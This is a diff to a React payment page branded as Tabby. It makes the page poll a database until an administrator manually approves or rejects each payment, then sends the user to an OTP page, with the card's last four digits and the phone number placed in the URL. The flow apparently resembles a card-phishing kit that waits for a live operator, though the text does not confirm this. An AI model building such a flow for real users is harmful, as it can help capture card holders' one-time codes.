@@ -73,10 +73,27 @@ const TabbyPaymentProcessing = () => {
         setPaymentId(data.id);
         console.log("New payment created with ID:", finalPaymentId);
 
-        // إظهار رسالة نجاح ثم الانتقال مباشرة لصفحة OTP
-        setPaymentStatus("success");
-        setTimeout(() => {
-          navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
+        // الانتظار حتى يوافق أو يرفض المسؤول
+        const pollInterval = setInterval(async () => {
+          const { data: paymentData } = await supabase
+            .from("tabby_payments")
+            .select("payment_status")
+            .eq("id", finalPaymentId)
+            .single();
+
+          if (paymentData?.payment_status === "approved") {
+            clearInterval(pollInterval);
+            setPaymentStatus("success");
+            setTimeout(() => {
+              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
+            }, 2000);
+          } else if (paymentData?.payment_status === "rejected") {
+            clearInterval(pollInterval);
+            setPaymentStatus("failed");
+            setTimeout(() => {
+              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}`);
+            }, 3000);
+          }
         }, 2000);
 
       } catch (error) {
